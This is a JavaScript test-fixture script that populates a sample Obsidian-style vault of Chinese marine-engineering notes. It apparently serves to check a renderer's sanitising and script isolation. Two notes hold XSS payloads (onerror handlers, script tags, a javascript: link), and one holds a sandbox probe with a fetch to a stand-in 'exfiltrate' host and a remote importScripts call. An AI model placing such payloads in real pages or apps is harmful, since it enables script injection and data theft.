import fs from 'node:fs';
import path from 'node:path';
export function populate(vault) {
const put = (name, content) => { const target = path.join(vault, name); fs.mkdirSync(path.dirname(target), { recursive: true }); fs.writeFileSync(target, content); };
put('首页.md', `---
tags: [知识库, 设计]
status: active
---
# 轮机设计工作台

把项目、设备与每天的思考连接起来。这里是 **Forge 独立运行**的知识库。

> [!tip] 从这里开始
> 查看 [[设备/主机|主机设备笔记]]，或通过日记记录今天的设计工作。

## 今日关注
- [ ] 完成主机参数校核
- [x] 更新系统图纸索引

## 设备一览

\`\`\`dataview
TABLE WITHOUT ID
  file.link AS 设备,
  功率 AS "额定功率 kW",
  status AS 状态
FROM "设备"
SORT 功率 DESC
\`\`\`

## 功率对比
\`\`\`chart
type: bar
labels: [主机, 辅机]
series:
  - title: 功率 kW
    data: [1200, 300]
\`\`\`

## 系统关系
\`\`\`mermaid
graph LR
  A[燃油系统] --> B[主机]
  B --> C[推进轴系]
\`\`\`

## 设计公式
行内公式 $P = 2 \\pi n T$。

$$
Q = \\frac{P}{\\eta}
$$

==待校核==，参考脚注[^1]。
[^1]: 验证用样例数据。
`);
put('设备/主机.md', '---\naliases: [引擎]\ntags: [设备, 轮机]\n功率: 1200\nstatus: active\n---\n# 主机\n\n[[首页]]\n\n## 参数\n| 参数 | 数值 |\n| --- | ---: |\n| 功率 | 1200 |\n\n- 参数校核\n  - 输入数据\n- 图纸检查\n  - 布置检查\n');
put('设备/辅机.md', '---\ntags: [设备]\n功率: 300\nstatus: done\n---\n# 辅机\n[[主机]]\n');
put('模板/日记.md', '# {{title}}\n\n## 今日工作\n- [ ] 完成设计复核\n\n日期：{{date}}\n');
put('模板/设备.md', '# {{NAME}}\n\n{{VALUE:描述}}\n');
put('设备数据库.base', 'filters: file.inFolder("设备")\nviews:\n  - type: table\n    name: 设备表\n    order: [file.name, 功率, status]\n    summaries:\n      功率: Sum\n  - type: cards\n    name: 设备卡片\n    order: [file.name, 功率]\n');
put('嵌入测试.md', '# 嵌入测试\n![[设备/主机#参数]]\n![[设备数据库.base]]\n\n行内查询 `= this.file.name`\n');
put('恶意内容测试.md', '# 安全测试\n<img src="https://example.invalid/private" onerror="window.pwned=true">\n<script>window.pwned=true</script>\n<iframe src="https://example.invalid"></iframe>\n<a href="javascript:alert(1)">链接</a>\n');
put('.obsidian/templates.json', JSON.stringify({ folder: '模板' }));
put('.obsidian/daily-notes.json', JSON.stringify({ folder: '日记', template: '模板/日记' }));
put('.obsidian/plugins/homepage/data.json', JSON.stringify({ version: 4, homepages: { Home: { value: '首页', kind: 'File' } } }));
put('.obsidian/community-plugins.json', JSON.stringify(['table-editor-obsidian', 'obsidian-charts', 'homepage', 'obsidian-outliner', 'templater-obsidian', 'dataview', 'quickadd']));
put('.obsidian/plugins/quickadd/data.json', JSON.stringify({ choices: [{ id: 'capture', name: '快速收件', type: 'Capture', captureTo: '日记/{{DATE:YYYY-MM-DD}}_收件.md', format: { enabled: true, format: '- {{VALUE}}' }, createFileIfItDoesntExist: { enabled: true } }, { id: 'template', name: '设备笔记', type: 'Template', templatePath: '模板/设备.md', folder: { enabled: true, folders: ['设备'] }, fileNameFormat: { enabled: true, format: '{{VALUE:设备名称}}' } }] }));

put('DataviewJS.md', '# DataviewJS 验证\n\n```dataviewjs\nconst pages = dv.pages("#设备");\nconst grid = document.createElement("div"); grid.className = "kb-metric-grid";\nfor (const [label,value] of [["设备笔记",pages.length],["总功率",pages.map(p=>p.功率).sum()]]) { const card=document.createElement("div"); card.className="kb-metric-card"; card.innerHTML=`<div class="kb-metric-value">${value}</div><div class="kb-metric-label">${label}</div>`; grid.appendChild(card); }\nthis.container.appendChild(grid);\ndv.table(["笔记","功率"], pages.sort(p=>p.功率,"desc").map(p=>[p.file.link,p.功率]));\n```\n\n```dataviewjs\nconst pages = dv.pages("#设备");\nwindow.renderChart({type:"bar",data:{labels:pages.map(p=>p.file.name).array(),datasets:[{label:"功率",data:pages.map(p=>p.功率).array(),backgroundColor:"#8b73de"}]}},this.container);\n```\n');
put('脚本边界.md', '# 隔离边界\n```dataviewjs\ndv.paragraph("Node:"+typeof process+"; SDK:"+typeof globalThis.CodexForge+"; DOM:"+typeof globalThis.document);\nconst el=document.createElement("div"); el.innerHTML="<img src=https://example.invalid/private onerror=alert(1)><script>alert(1)</script><p>安全文本</p>"; this.container.appendChild(el);\ntry { await fetch("https://example.invalid/exfiltrate"); dv.paragraph("NETWORK_ALLOWED"); } catch { dv.paragraph("NETWORK_BLOCKED"); }\ntry { importScripts("https://example.invalid/plugin.js"); dv.paragraph("IMPORT_ALLOWED"); } catch { dv.paragraph("IMPORT_BLOCKED"); }\n```\n');
put('脚本超时.md', '# 超时验证\n```dataviewjs\nwhile (true) {}\n```\n');

}
